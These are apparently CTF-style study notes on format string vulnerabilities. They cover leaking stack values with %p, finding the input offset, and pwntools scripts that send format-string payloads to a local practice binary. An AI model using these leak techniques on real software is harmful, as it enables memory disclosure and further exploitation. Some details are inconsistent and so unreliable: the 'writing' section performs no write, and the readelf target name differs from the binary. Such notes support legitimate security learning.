## Format String vulnerability

### Resources
> A simple Format String exploit example - bin 0x11 (LiveOverflow)  
> https://www.youtube.com/watch?v=0WvrSfcdq1I  

### Format String
> https://ir0nstone.gitbook.io/notes/types/stack/format-string

### Indentifying a format string vulnerability

Look for Any printf function that takes your input thats first and only parameter.

Using the %p allows you to enumerate the addresses on the stack.

### Finding the index of the user input of the stack

Using the %p multiple times until you can identify your exact offset of your index.

Example:

./vuln

AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

We can see in the below result that index #6 is the offset of where our A's are.

AAAA 0xf63d4e2e 0xfff359a0 0x804918c 0xfff35a34 0xf7f33470 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520

Extracting the exact offset for the index selected

./vuln

%6$p

Confirming the offset by reading the user input

AAAA %6$p

### Writing to the stack

Retrieving the base address

```
readelf --all auth
0x08048000 base address of vuln
```

```python
from pwn import *

p = process("./vuln")
base_addr = p32(0x08048000)

buf = b"" 
buf += b"%7$p" + base_addr

p.sendline(buf)
p.interactive()
```

### Reading the value at the address

```
readelf --all auth
0x08048000 base address of vuln
```

```python
from pwn import *

p = process("./vuln")
base_addr = p32(0x08048000)

buf = b"" 
buf += b"%7$s" + base_addr

p.sendline(buf)
p.interactive()
```

